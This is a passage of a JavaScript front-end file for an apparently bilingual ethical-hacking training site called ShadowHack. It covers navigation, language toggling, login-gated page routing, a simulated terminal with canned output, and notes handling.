/* app.js – التحكم في التنقل واللغة والوظائف العامة */


const sections = [
  // Main Navigation - Top Bar (simplified)
  { id: "hub", ar: "🎯 المركز", en: "🎯 Hub" },

  { id: "domains", ar: "📚 المجالات", en: "📚 Domains" },
  { id: "courses", ar: "📖 الكورسات", en: "📖 Courses" },

  { id: "lab-paths", ar: "🧪 المختبرات", en: "🧪 Labs" },
  { id: "ctf-arena", ar: "🏆 CTF", en: "🏆 CTF" },

  // New Features
  { id: "leaderboard", ar: "🥇 المتصدرين", en: "🥇 Leaderboard" },
  { id: "achievements", ar: "🎖️ الإنجازات", en: "🎖️ Achievements" },
  { id: "notes", ar: "📝 ملاحظاتي", en: "📝 Notes" },
  { id: "daily-challenge", ar: "⏰ التحدي اليومي", en: "⏰ Daily" },

  { id: "career", ar: "💼 الوظيفة", en: "💼 Career" },
  { id: "settings", ar: "⚙️ الإعدادات", en: "⚙️ Settings" }
];

let currentLang = 'en'; // Current language (English default)
let currentPage = 'home';

// Helper function for bilingual text
function txt(ar, en) {
  return currentLang === 'ar' ? ar : en;
}

// Theme: Dark mode only (no light mode)
function initTheme() {
  document.body.classList.add('dark-mode');
}
document.addEventListener('DOMContentLoaded', initTheme);

// Render navigation
function renderNav() {
  // Old navbar disabled - using MegaNavbar from cyberpunk-components.js
  const navList = document.getElementById('nav-list');
  if (!navList) return;
  // Hide old nav if exists
  navList.style.display = 'none';
}

// Attach copy buttons functionality
function attachCopyButtons() {
  document.querySelectorAll('.copy-btn, .copy').forEach(btn => {
    if (!btn.hasAttribute('data-copy-attached')) {
      btn.setAttribute('data-copy-attached', 'true');
      btn.addEventListener('click', () => handleCopyButton(btn));
    }
  });
}

// Progress tracking
let studyProgress = JSON.parse(localStorage.getItem('studyProgress') || '{}');
let studyStats = JSON.parse(localStorage.getItem('studyStats') || '{"totalTime": 0, "sessionsCount": 0, "lastSession": null}');
let currentSessionStart = null;
// let bookmarks = JSON.parse(localStorage.getItem('studyhub_bookmarks') || '[]');
let customPayloads = JSON.parse(localStorage.getItem('customPayloads') || '[]');
let quizScores = JSON.parse(localStorage.getItem('quizScores') || '{}');

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  // Migration: Reset language to English (v2.0 default change)
  if (!localStorage.getItem('langMigrationV2')) {
    localStorage.removeItem('preferredLanguage');
    localStorage.setItem('langMigrationV2', 'done');
  }

  // Load saved preferences
  const savedLang = localStorage.getItem('preferredLanguage') || 'en';

  // Apply saved preferences
  currentLang = savedLang;

  // Set initial language button text
  const langToggle = document.getElementById('lang-toggle');
  if (langToggle) {
    langToggle.innerHTML = currentLang === 'ar' ? '<i class="fas fa-language"></i> English' : '<i class="fas fa-language"></i> العربية';
  }

  // Set document direction and language
  document.documentElement.lang = currentLang;
  // FIX: Force LTR for layout consistency as requested
  document.documentElement.dir = 'ltr';

  // Trigger V6 Loading Screen
  if (typeof LoadingPageV6 !== 'undefined') {
    LoadingPageV6.show('INITIALIZING V6 KERNEL...');
  }
});

// Gamification System
// Gamification is now handled by gamification.js

// Global Terminal
const terminal = {
  isOpen: false,
  history: [],
  historyIndex: -1,

  init() {
    this.injectHTML();
    document.addEventListener('keydown', (e) => {
      if (e.key === '`' || e.key === '~') {
        e.preventDefault();
        this.toggle();
      }
    });
  },

  injectHTML() {
    const div = document.createElement('div');
    div.id = 'global-terminal';
    div.style.cssText = `
      position: fixed; top: 0; left: 0; width: 100%; height: 300px;
      background: rgba(0, 0, 0, 0.9); color: #0f0; font-family: monospace;
      z-index: 9999; display: none; padding: 10px; overflow-y: auto;
      border-bottom: 2px solid #0f0; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
    `;
    div.innerHTML = `
      <div id="term-output">Welcome to ShadowHack Terminal v2.0\nType 'help' for commands.\n</div>
      <div class="d-flex">
        <span class="me-2">$</span>
        <input id="term-input" type="text" style="background: transparent; border: none; color: #0f0; width: 100%; outline: none; font-family: monospace;" autocomplete="off">
      </div>
    `;
    document.body.appendChild(div);

    const input = document.getElementById('term-input');
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        this.execute(input.value);
        input.value = '';
      }
    });
  },

  toggle() {
    this.isOpen = !this.isOpen;
    const term = document.getElementById('global-terminal');
    term.style.display = this.isOpen ? 'block' : 'none';
    if (this.isOpen) document.getElementById('term-input').focus();
  },

  execute(cmd) {
    const output = document.getElementById('term-output');
    output.innerHTML += `<div>$ ${cmd}</div>`;

    const args = cmd.trim().split(' ');
    const command = args[0].toLowerCase();

    let response = '';
    switch (command) {
      case 'help':
        response = 'Available commands: help, clear, whoami, date, xp, nmap, curl, base64';
        break;
      case 'clear':
        output.innerHTML = '';
        return;
      case 'whoami':
        response = `root@shadow-hack (${gamification.state.rank})`;
        break;
      case 'date':
        response = new Date().toString();
        break;
      case 'xp':
        response = `Level: ${gamification.state.level} | XP: ${gamification.state.xp} | Rank: ${gamification.state.rank}`;
        break;
      case 'nmap':
        if (!args[1]) response = 'Usage: nmap <target>';
        else response = `Starting Nmap 7.92 at ${new Date().toLocaleTimeString()}\nNmap scan report for ${args[1]}\nHost is up (0.002s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 1.52 seconds`;
        xpSystem.addXp(10);
        break;
      case 'curl':
        if (!args[1]) response = 'Usage: curl <url>';
        else response = `HTTP/1.1 200 OK\nDate: ${new Date().toUTCString()}\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html\n\n<html>...</html>`;
        xpSystem.addXp(5);
        break;
      case 'base64':
        if (!args[1]) response = 'Usage: base64 <text>';
        else response = btoa(args.slice(1).join(' '));
        break;
      default:
        response = `Command not found: ${command}`;
    }

    output.innerHTML += `<div class="text-white-50 mb-2">${response.replace(/\n/g, '<br>')}</div>`;
    output.scrollTop = output.scrollHeight;
  }
};

document.addEventListener('DOMContentLoaded', () => {
  // Initialize language
  const savedLang = localStorage.getItem('preferredLanguage');
  if (savedLang) {
    currentLang = savedLang;
    const langToggle = document.getElementById('lang-toggle');
    if (langToggle) {
      langToggle.innerHTML = currentLang === 'ar' ? '<i class="fas fa-language"></i> English' : '<i class="fas fa-language"></i> العربية';
    }
  }
  document.documentElement.lang = currentLang;
  document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';

  // Initialize the app
  renderNav();

  // Initialize MegaNavbar after language is set
  if (typeof MegaNavbar !== 'undefined') {
    MegaNavbar.init();
  }

  // Init v2.0 Systems
  if (typeof xpSystem !== 'undefined') xpSystem.init();
  terminal.init();

  loadPage('home');

  // Start session tracking
  startSession();

  // Add event listeners
  const langToggleBtn = document.getElementById('lang-toggle');
  if (langToggleBtn) {
    langToggleBtn.addEventListener('click', toggleLang);
  }

  // Global copy button handler (delegation)
  document.body.addEventListener('click', (e) => {
    if (e.target.classList.contains('copy') || e.target.classList.contains('copy-btn')) {
      handleCopyButton(e.target);
    }
  });

  // Init Auth UI
  updateAuthUI();
  window.addEventListener('authStateChanged', updateAuthUI);
});

// Update Auth UI (Navbar)
function updateAuthUI() {
  const loginBtn = document.getElementById('login-btn');
  const userMenu = document.getElementById('user-menu');
  const token = sessionStorage.getItem('auth_token');

  if (token) {
    // User is logged in
    if (loginBtn) loginBtn.style.display = 'none';
    if (userMenu) {
      userMenu.style.display = 'block';

      // Update user info
      const user = JSON.parse(sessionStorage.getItem('auth_user') || '{}');
      const userNameEl = document.getElementById('user-name');
      const dropdownNameEl = document.getElementById('dropdown-username');
      const dropdownEmailEl = document.getElementById('dropdown-email');

      if (userNameEl) userNameEl.textContent = user.username || 'User';
      if (dropdownNameEl) dropdownNameEl.textContent = user.username || 'User';
      if (dropdownEmailEl) dropdownEmailEl.textContent = user.email || '';
    }
  } else {
    // User is logged out
    if (loginBtn) loginBtn.style.display = 'flex';
    if (userMenu) userMenu.style.display = 'none';
  }
}


// Function to get icon for each page
function getIcon(id) {
  const icons = {
    // Main Hub
    hub: 'rocket',
    home: 'house-chimney',

    // Domains
    'red-team': 'crosshairs',
    'blue-team': 'shield-halved',
    domains: 'sitemap',

    // Learning
    pentest: 'user-graduate',
    courses: 'layer-group',
    rooms: 'dungeon',
    'lab-paths': 'flask',
    courses: 'layer-group',
    rooms: 'dungeon',
    'lab-paths': 'flask',
    learn: 'road',
    modules: 'cubes',
    walkthroughs: 'play',
    networks: 'network-wired',

    // Practice & CTF
    'ctf-arena': 'trophy',
    ctf: 'flag-checkered',
    leaderboard: 'ranking-star',

    // Tools
    toolshub: 'screwdriver-wrench',
    labs: 'flask-vial',
    locallabs: 'server',
    tools: 'toolbox',
    payloads: 'file-code',

    // Career
    bugbounty: 'bug-slash',
    career: 'briefcase',

    // Dashboard & Analytics
    dashboard: 'chart-pie',
    overview: 'list-check',
    analytics: 'chart-line',

    // Pentest Phases
    recon: 'binoculars',
    scan: 'satellite-dish',
    vulns: 'shield-virus',
    exploit: 'masks-theater',
    post: 'network-wired',

    // Reference
    playground: 'ghost',
    ejpt: 'certificate',

    // Extras
    writeups: 'book-journal-whills',
    notes: 'note-sticky',
    settings: 'sliders',
    report: 'file-contract'
  };
  return icons[id] || 'circle-dot';
}

function toggleLang() {
  // Toggle between Arabic and English
  currentLang = currentLang === 'ar' ? 'en' : 'ar';

  // Save preference
  localStorage.setItem('preferredLanguage', currentLang);

  // Update UI
  // Update UI
  document.documentElement.lang = currentLang;
  // FIX: Force LTR for layout consistency as requested
  document.documentElement.dir = 'ltr';
  document.getElementById('lang-toggle').innerHTML = currentLang === 'ar' ? '<i class="fas fa-language"></i> English' : '<i class="fas fa-language"></i> العربية';

  // Re-render MegaNavbar with new language properly
  if (typeof refreshCyberNavbar === 'function') {
    refreshCyberNavbar();
  }

  loadPage(currentPage);


  // Update page title
  document.title = currentLang === 'ar'
    ? 'ShadowHack – مختبرات الاختراق الأخلاقي'
    : 'ShadowHack – Ethical Hacking Labs';
}

function loadPage(id, param = null) {
  console.log('DEBUG: loadPage called', { id, param });

  // Handle "route:param" shorthand
  if (id && id.includes(':') && !param) {
    const parts = id.split(':');
    id = parts[0];
    param = parts.slice(1).join(':');
    console.log('DEBUG: Parsed route:', { id, param });
  }

  console.log('XXX DEBUG loadPage:', id, param);
  currentPage = id;

  // Update AI Hints Context
  if (typeof aiHints !== 'undefined') {
    aiHints.updateContext(id);
  }

  document.querySelectorAll('#sidebar li').forEach(li => {
    li.classList.toggle('active', li.dataset.id === id);
  });

  // Auth Protection
  const protectedPages = ['hub', 'profile', 'settings', 'certificates', 'dashboard', 'lab-paths'];

  // FIX: Use 'auth_token' and sessionStorage
  // FIX: Check AuthState first, then localStorage (primary), then sessionStorage (legacy)
  const isAuth = (typeof AuthState !== 'undefined' && AuthState.isLoggedIn()) ||
    localStorage.getItem('auth_token') ||
    sessionStorage.getItem('auth_token');

  const token = isAuth; // Keep variable name for logic below

  if (protectedPages.includes(id) && !token) {
    if (typeof showToast === 'function') showToast(txt('يجب تسجيل الدخول أولاً', 'Please login first'), 'warning');
    id = 'login';
    currentPage = 'login';
  }

  const content = document.getElementById('content');
  switch (id) {
    case 'daily-drill':
      content.innerHTML = pageDailyDrill();
      break;
    case 'analytics':
      content.innerHTML = pageAnalytics();
      break;
    case 'hardware-lab':
      content.innerHTML = pageHardwareLab();
      break;
    case 'report-generator':
      content.innerHTML = pageReportGenerator();
      break;
    case 'blue-team':
      content.innerHTML = pageBlueTeam();
      break;
    case 'utility-belt':
      content.innerHTML = pageUtilityBelt();
      break;
    case 'bug-bounty':
      content.innerHTML = pageBugBounty();
      break;
    case 'ad-lab':
      content.innerHTML = pageADLab();
      break;
    case 'cloud-lab':
      content.innerHTML = pageCloudLab();
      break;
    case 'api-lab':
      content.innerHTML = pageAPILab();
      break;
    case 'mitre-matrix':
      content.innerHTML = pageMitreMatrix();
      break;
    case 'cheatsheet':
    case 'command-ref':
      content.innerHTML = pageCommandRef();
      break;
    case 'community':
      content.innerHTML = pageCommunity();
      break;
    case 'malware-lab':
      content.innerHTML = pageMalwareLab();
      break;
    case 'network-analyzer':
      content.innerHTML = pageNetworkAnalyzer();
      break;
    case 'crypto-lab':
      content.innerHTML = pageCryptoLab();
      break;
    case 'stego-lab':
      content.innerHTML = pageStegoLab();
      break;
    case 'forensics-lab':
      content.innerHTML = pageForensicsLab();
      break;
    case 'osint-lab':
      content.innerHTML = pageOSINTLab();
      break;
    case 'password-lab':
      content.innerHTML = pagePasswordLab();
      break;
    case 'social-eng-lab':
      content.innerHTML = pageSocialEngLab();
      break;
    case 'web-exploit-lab':
      content.innerHTML = pageWebExploitLab();
      break;
    case 'privesc-lab':
      content.innerHTML = pagePrivEscLab();
      break;
    case 'revshell-gen':
      content.innerHTML = pageRevShellGen();
      break;
    case 'recon-lab':
      content.innerHTML = pageReconLab();
      break;
    case 'api-hack-lab':
      content.innerHTML = pageAPIHackLab();
      break;
    case 'ad-lab':
      content.innerHTML = pageADLab();
      break;
    case 'bugbounty-dash':
      content.innerHTML = pageBugBountyDash();
      break;
    case 'payload-gen':
      content.innerHTML = pagePayloadGen();
      break;
    case 'cve-watch':
      content.innerHTML = pageCVEWatch();
      break;
    case 'finding-reporter':
      content.innerHTML = pageFindingReporter();
      break;
    case 'recon-dashboard':
      content.innerHTML = pageReconDashboard();
      break;
    case 'stealth-lab':
      content.innerHTML = pageStealthLab();
      break;
    case 'payload-bakery':
      content.innerHTML = pagePayloadBakery();
      break;
    case 'encoder-tool':
      content.innerHTML = typeof pageEncoderTool !== 'undefined' ? pageEncoderTool() : '<div style="padding:40px;color:#fff;">Loading Encoder Tool...</div>';
      break;

    case 'exfiltration-lab':
      content.innerHTML = pageExfilLab();
      break;

    case 'infra-monitor':
      content.innerHTML = pageInfraMonitor();
      break;

    case 'osint-monitor':
      content.innerHTML = pageOsintMonitor();
      break;

    case 'vuln-manager':
      content.innerHTML = pageVulnManager();
      break;

    case 'malware-sandbox':
      content.innerHTML = pageMalwareSandbox();
      break;

    case 'ad-lab-pro':
      content.innerHTML = pageAdLabPro();
      break;

    case 'zero-trust':
      content.innerHTML = pageZeroTrustLab();
      break;

    case 'devsecops':
      content.innerHTML = pageDevSecOpsLab();
      break;

    case 'ir-playbook':
      content.innerHTML = pageIRPlaybook();
      break;

    case 'security-awareness':
      content.innerHTML = pageSecurityAwareness();
      break;
    case 'lateral-movement':
      content.innerHTML = pageLateralMovement();
      break;
    case 'unified-stats':
      content.innerHTML = pageUnifiedStats();
      break;
    case 'bug-bounty-sim':
      content.innerHTML = typeof BugBountySimulator !== 'undefined' ? BugBountySimulator.render() : '<div style="padding:40px;color:#fff;">Loading Bug Bounty Simulator...</div>';
      break;
    case 'attack-builder':
      content.innerHTML = typeof pageAttackBuilder !== 'undefined' ? pageAttackBuilder() : '<div style="padding:40px;color:#fff;">Loading Attack Builder...</div>';
      break;
    case 'js-monitor':
      content.innerHTML = typeof pageJSMonitor !== 'undefined' ? pageJSMonitor() : '<div style="padding:40px;color:#fff;">Loading JS Monitor...</div>';
      break;
    case 'encoder-tool':
      content.innerHTML = typeof pageEncoderTool !== 'undefined' ? pageEncoderTool() : '<div style="padding:40px;color:#fff;">Loading Encoder Tool...</div>';
      break;
    case 'cve-museum':
      content.innerHTML = typeof pageCVEMuseum !== 'undefined' ? pageCVEMuseum() : '<div style="padding:40px;color:#fff;">Loading CVE Museum...</div>';
      break;
    case 'srs-flashcards':
      content.innerHTML = typeof pageSRSFlashcards !== 'undefined' ? pageSRSFlashcards() : '<div style="padding:40px;color:#fff;">Loading SRS Flashcards...</div>';
      break;
    case 'persona-factory':
      content.innerHTML = typeof pagePersonaFactory !== 'undefined' ? pagePersonaFactory() : '<div style="padding:40px;color:#fff;">Loading Persona Factory...</div>';
      break;
    case 'edr-arena':
      content.innerHTML = typeof pageEDRArena !== 'undefined' ? pageEDRArena() : '<div style="padding:40px;color:#fff;">Loading EDR Arena...</div>';
      break;
    case 'ad-lab':
      content.innerHTML = typeof pageADLab !== 'undefined' ? pageADLab() : '<div style="padding:40px;color:#fff;">Loading AD Lab...</div>';
      break;
    case 'home':
      content.innerHTML = pageHome();
      if (typeof initHomePage === 'function') setTimeout(initHomePage, 50);
      break;
    case 'second-brain':
      html = BrainUI.renderPage();
      content.innerHTML = html;
      break;
    case 'pentest': content.innerHTML = pagePenTest(); break;
    case 'profile': content.innerHTML = typeof pageProfileV6 === 'function' ? pageProfileV6() : pageProfile(); break;
    case 'account': content.innerHTML = pageAccount(); break;
    case 'bookmarks': content.innerHTML = pageBookmarks(); break;

    case 'dashboard': content.innerHTML = typeof pageDashboardV6 === 'function' ? pageDashboardV6() : pageDashboard(); break;
    case 'overview': content.innerHTML = pageOverview(); break;
    case 'recon': content.innerHTML = pageRecon(); break;
    case 'scan': content.innerHTML = pageScan(); break;
    case 'vulns': content.innerHTML = pageVulns(); break;
    case 'exploit': content.innerHTML = pageExploit(); break;
    case 'post': content.innerHTML = pagePost(); break;
    case 'report': content.innerHTML = pageReport(); break;
    case 'report': content.innerHTML = pageReport(); break;
    case 'labs': content.innerHTML = typeof pageLabsHub === 'function' ? pageLabsHub() : '<h2>Labs Coming Soon</h2>'; break;
    case 'tools':
    case 'toolshub':
      content.innerHTML = typeof pageToolsHub === 'function' ? pageToolsHub() : (typeof pageCheatsheets === 'function' ? pageCheatsheets() : '<h2>Tools Coming Soon</h2>');
      break;
    case 'payloads': content.innerHTML = pagePayloads(); break;
    case 'bugbounty': content.innerHTML = pageBugBounty(); break;
    case 'notes':
      content.innerHTML = pageNotes();
      // Initialize enhanced notes
      setTimeout(initNotes, 100);
      break;

    case 'settings': content.innerHTML = typeof pageSettingsV6 === 'function' ? pageSettingsV6() : (typeof pageSettingsV2 === 'function' ? pageSettingsV2() : pageSettings()); break;
    case 'ejpt': content.innerHTML = pageEjpt(); break;
    case 'locallabs': content.innerHTML = pageLocalLabs(); break;
    case 'practice': content.innerHTML = typeof pageCTF === 'function' ? pageCTF() : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;


    case 'writeups': content.innerHTML = pageWriteups(); break;
    case 'writeup-viewer':
      content.innerHTML = pageWriteupViewer(param);
      break;

    case 'learningpaths':
    case 'learning-paths':
    case 'skill-tree':
    case 'roadmaps':
      content.innerHTML = typeof pageLearningPathsV6 === 'function' ? pageLearningPathsV6() : '<div style="padding:40px;color:#fff;">Loading V6 Path...</div>';
      break;

    case 'path-roadmap':
      content.innerHTML = typeof pagePathDetailsV6 === 'function' ? pagePathDetailsV6(param) : (typeof pagePathRoadmap === 'function' ? pagePathRoadmap(param) : '<h2>Roadmap not found</h2>');
      break;

    case 'module-learning':
      content.innerHTML = typeof pageLearningInterfaceV6 === 'function' ? pageLearningInterfaceV6(param) : (typeof pageModuleLearning === 'function' ? pageModuleLearning(param) : '<h2>Module not found</h2>');
      break;

    case 'certificates': content.innerHTML = pageCertificates(); break;
    // V2 Routes
    case 'courses': content.innerHTML = typeof pageCoursesV6 === 'function' ? pageCoursesV6() : '<div style="padding:40px;color:#fff;">Loading V6 Courses...</div>'; break;
    case 'ctf-arena': content.innerHTML = pageCTFV2(); break;
    case 'course-viewer': content.innerHTML = pageCourseViewer(param); break;
    case 'module-viewer':
      const [courseId, moduleId] = param.split('/');
      content.innerHTML = pageModuleViewer(courseId, moduleId);
      break;

    case 'youtube-courses': content.innerHTML = typeof pageYoutubeCourses === 'function' ? pageYoutubeCourses() : '<div>Loading Community Courses...</div>'; break;
    case 'youtube-player':
      content.innerHTML = typeof pageYoutubePlayer === 'function' ? pageYoutubePlayer(param) : '<div>Loading Player...</div>';
      break;
    case 'youtube-viewer':
      if (!param) { content.innerHTML = 'Error: No playlist ID specified'; break; }
      content.innerHTML = `
        <div class="container-fluid learn-container h-100 p-0">
             <div class="d-flex align-items-center bg-dark p-3 border-bottom border-secondary">
                <button class="btn btn-outline-light me-3" onclick="loadPage('youtube-courses')"><i class="fas fa-arrow-left"></i> Back</button>
                <h4 class="m-0 text-white">Playlist Viewer</h4>
             </div>
             <div class="ratio ratio-16x9 h-100">
                <iframe src="https://www.youtube.com/embed/videoseries?list=${param}" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
             </div>
        </div>
      `;
      break;
      break;

    case 'bugbounty': content.innerHTML = pageBugBounty(); break;
    case 'career': content.innerHTML = pageCareer(); break;

    case 'lab-paths': content.innerHTML = pageLabPaths(); break;
    case 'lab-path-viewer': content.innerHTML = pageLabPathViewer(param); break;
    case 'lab-viewer': content.innerHTML = pageLabViewer(param); break;

    // Cyberpunk Module Viewer
    case 'cyber-module': content.innerHTML = typeof pageEnhancedModuleViewer === 'function' ? pageEnhancedModuleViewer(param) : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;

    // SOC Simulator
    case 'socsimulator': content.innerHTML = typeof pageSOCSimulator === 'function' ? pageSOCSimulator() : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;
    case 'c2simulator': content.innerHTML = typeof pageC2Simulator === 'function' ? pageC2Simulator() : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;
    case 'owaspsimulator': content.innerHTML = typeof pageOWASPSimulator === 'function' ? pageOWASPSimulator() : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;
    case 'shadowos': content.innerHTML = typeof pageShadowOS === 'function' ? pageShadowOS() : '<div style="padding:40px;color:#fff;">Loading...</div>'; break;

    // Unified Room Viewer (Handles both V1 and V2 labs)
    case 'room-viewer':
      content.innerHTML = typeof roomViewer !== 'undefined' ? roomViewer.loadRoom(param) : pageRoomViewer(param);
      break;

    // TryHackMe-style pages
    case 'soc-simulator': content.innerHTML = typeof pageSOCSimulator === 'function' ? pageSOCSimulator() : pagePlaceholder('SOC Simulator', 'Triage alerts in realtime'); break;
    case 'threat-hunting': content.innerHTML = typeof pageThreatHunting === 'function' ? pageThreatHunting() : pagePlaceholder('Threat Hunting', 'Reconstruct the attack chain'); break;
    case 'koth': content.innerHTML = typeof pageKOTH === 'function' ? pageKOTH() : pagePlaceholder('King of the Hill', 'Attack & Defend in realtime'); break;

    case 'leagues': content.innerHTML = pageLeaderboard(); break;
    case 'roadmaps': loadPage('learn'); break; // Redirect to Learn page Roadmaps tab
    case 'dark-gravity': content.innerHTML = typeof pageDarkGravity === 'function' ? pageDarkGravity() : pageRoomViewer('dark-gravity-ctf'); break;

    // New Platform Pages
    case 'hub': content.innerHTML = pageHub(); break;
    case 'domains': content.innerHTML = pageDomains(); break;
    case 'red-team': content.innerHTML = pageDomainView('red-team'); break;
    case 'blue-team': content.innerHTML = pageDomainView('blue-team'); break;
    case 'domain-view': content.innerHTML = pageDomainView(param); break;
    case 'public-profile': content.innerHTML = typeof pageProfileV6 === 'function' ? pageProfileV6(param) : pagePublicProfile(param); break;
    case 'ctf-arena': content.innerHTML = pageCTFArena(); break;
    case 'ctf': content.innerHTML = pageCTF(); break;
    case 'ctf-challenge': content.innerHTML = typeof pageCTFChallenge === 'function' ? pageCTFChallenge(param) : '<h2>Challenge not found</h2>'; break;
    case 'leaderboard': content.innerHTML = typeof pageLeaderboard === 'function' ? pageLeaderboard() : '<h2>Leaderboard coming soon</h2>'; break;
    case 'achievements': content.innerHTML = typeof pageAchievements === 'function' ? pageAchievements() : '<h2>Achievements coming soon</h2>'; break;
    // Notes is already handled correctly in line 439
    case 'daily-challenge': content.innerHTML = typeof pageDailyChallenge === 'function' ? pageDailyChallenge() : '<h2>Daily Challenge coming soon</h2>'; break;

    // New Missing Pages
    case 'path-red-team': content.innerHTML = typeof CareerTrackDetail !== 'undefined' ? CareerTrackDetail.render('red-teamer') : '<h2>Coming Soon</h2>'; break;
    case 'path-blue-team': content.innerHTML = typeof CareerTrackDetail !== 'undefined' ? CareerTrackDetail.render('security-engineer') : '<h2>Coming Soon</h2>'; break;
    case 'path-soc': content.innerHTML = typeof CareerTrackDetail !== 'undefined' ? CareerTrackDetail.render('soc-analyst') : '<h2>Coming Soon</h2>'; break;
    case 'path-bug-bounty': content.innerHTML = typeof CareerTrackDetail !== 'undefined' ? CareerTrackDetail.render('bug-bounty-hunter') : pageBugBounty(); break;
    case 'path-pre-security': content.innerHTML = pageLabPaths(); break;
    case 'topic-web': content.innerHTML = typeof pageTopicWeb === 'function' ? pageTopicWeb() : '<h2>Coming Soon</h2>'; break;
    case 'topic-network': content.innerHTML = typeof pageTopicNetwork === 'function' ? pageTopicNetwork() : '<h2>Coming Soon</h2>'; break;
    case 'topic-forensics': content.innerHTML = typeof pageTopicForensics === 'function' ? pageTopicForensics() : '<h2>Coming Soon</h2>'; break;
    case 'topic-scripting': content.innerHTML = typeof pageTopicScripting === 'function' ? pageTopicScripting() : '<h2>Coming Soon</h2>'; break;
    case 'topic-linux': content.innerHTML = typeof pageTopicLinux === 'function' ? pageTopicLinux() : '<h2>Coming Soon</h2>'; break;
    case 'free-labs': content.innerHTML = typeof pageFreeLabs === 'function' ? pageFreeLabs() : '<h2>Coming Soon</h2>'; break;
    case 'pro-labs': content.innerHTML = typeof pageProLabs === 'function' ? pageProLabs() : '<h2>Coming Soon</h2>'; break;
    case 'daily-ctf': content.innerHTML = typeof pageDailyCtf === 'function' ? pageDailyCtf() : '<h2>Coming Soon</h2>'; break;
    case 'past-ctf': content.innerHTML = typeof pagePastCtf === 'function' ? pagePastCtf() : '<h2>Coming Soon</h2>'; break;
    case 'cheatsheets': content.innerHTML = typeof pageCheatsheets === 'function' ? pageCheatsheets() : '<h2>Coming Soon</h2>'; break;
    case 'verify': content.innerHTML = typeof pageVerify === 'function' ? pageVerify() : '<h2>Coming Soon</h2>'; break;
    case 'docs': content.innerHTML = typeof pageDocs === 'function' ? pageDocs() : '<h2>Coming Soon</h2>'; break;

    case 'discussions': content.innerHTML = typeof pageDiscussions === 'function' ? pageDiscussions() : '<h2>Coming Soon</h2>'; break;
    case 'discord': window.open('https://discord.gg/studyhub', '_blank'); break;
    case 'about': content.innerHTML = typeof pageAbout === 'function' ? pageAbout() : '<h2>Coming Soon</h2>'; break;
    case 'partners': content.innerHTML = typeof pagePartners === 'function' ? pagePartners() : '<h2>Coming Soon</h2>'; break;
    case 'premium':
    case 'subscribe': content.innerHTML = typeof pageSubscribe === 'function' ? pageSubscribe() : '<h2>Coming Soon</h2>'; break;
    case 'careers': content.innerHTML = typeof pageCareers === 'function' ? pageCareers() : '<h2>Career Hub Coming Soon</h2>'; break;
    case 'career-track':
      const trackId = (typeof param === 'object' && param?.id) ? param.id : (param || 'soc-analyst');
      content.innerHTML = typeof CareerTrackDetail !== 'undefined' ? CareerTrackDetail.render(trackId) : '<h2>Career Track Loading...</h2>';
      break;

    // Job Simulations
    case 'sim-paths': content.innerHTML = JobSimUI.renderDashboard(); break;

    // Live Lab & Sandbox
    case 'sandbox': content.innerHTML = pagePayloadSandbox(); break;
    case 'red-team-ops': content.innerHTML = typeof RedTeamOps !== 'undefined' ? RedTeamOps.render() : '<h2>Error: Red Team Ops Module Not Loaded</h2>'; break;

    // Authentication Pages
    case 'login': content.innerHTML = pageLogin(); break;
    case 'register': content.innerHTML = pageRegister(); break;
    case 'forgot-password': content.innerHTML = pageForgotPassword(); break;
    case 'reset-password': content.innerHTML = pageResetPassword(); break;

    default: content.innerHTML = '<h2>غير محدد</h2>';
  }
  attachCopyButtons();
  updateProgressStats();
}



// User Menu Functions
function toggleUserDropdown() {
  const dropdown = document.getElementById('user-dropdown');
  if (dropdown) {
    dropdown.classList.toggle('show');

    // Close when clicking outside
    if (dropdown.classList.contains('show')) {
      document.addEventListener('click', closeUserDropdownOutside);
    } else {
      document.removeEventListener('click', closeUserDropdownOutside);
    }
  }
}

function closeUserDropdown() {
  const dropdown = document.getElementById('user-dropdown');
  if (dropdown) dropdown.classList.remove('show');
}

function closeUserDropdownOutside(event) {
  const userMenu = document.getElementById('user-menu');
  // If click is outside the user menu container
  if (userMenu && !userMenu.contains(event.target)) {
    closeUserDropdown();
    document.removeEventListener('click', closeUserDropdownOutside);
  }
}

// Save all notes
function saveAllNotes() {
  const notes = JSON.parse(localStorage.getItem('enhancedNotes') || '[]');
  const noteElements = document.querySelectorAll('.note-content');

  noteElements.forEach(element => {
    const noteId = parseInt(element.dataset.noteId);
    const note = notes.find(n => n.id === noteId);
    if (note) {
      note.content = element.value;
    }
  });

  localStorage.setItem('enhancedNotes', JSON.stringify(notes));
  alert(txt('تم حفظ جميع الملاحظات', 'All notes saved'));
}

// Delete a note
function deleteNote(noteId) {
  if (confirm(txt('هل تريد حذف هذه الملاحظة؟', 'Delete this note?'))) {
    const notes = JSON.parse(localStorage.getItem('enhancedNotes') || '[]');
    const updatedNotes = notes.filter(note => note.id !== noteId);
    localStorage.setItem('enhancedNotes', JSON.stringify(updatedNotes));
    renderNotes(updatedNotes);
  }
}

// Render all notes
function renderNotes(notes) {
  const container = document.getElementById('notes-container');
  if (!container) return;

  if (notes.length === 0) {
    container.innerHTML = `
      <div class="alert alert-secondary text-center">
        <i class="fa-solid fa-note-sticky"></i> 
        ${txt('لا توجد ملاحظات بعد. أضف ملاحظتك الأولى!', 'No notes yet. Add your first note!')}
      </div>
    `;
    return;
  }

  container.innerHTML = notes.map(note => `
    <div class="card mb-3">
      <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
        <h5 class="mb-0"><i class="fa-solid fa-note-sticky"></i> ${note.title}</h5>
        <button class="btn btn-sm btn-light" onclick="deleteNote(${note.id})">
          <i class="fa-solid fa-trash"></i> ${txt('حذف', 'Delete')}
        </button>
      </div>
      <div class="card-body">
        <textarea 
          class="form-control note-content" 
          data-note-id="${note.id}" 
          rows="5" 
          placeholder="${txt('اكتب ملاحظتك هنا...', 'Write your note here...')}"
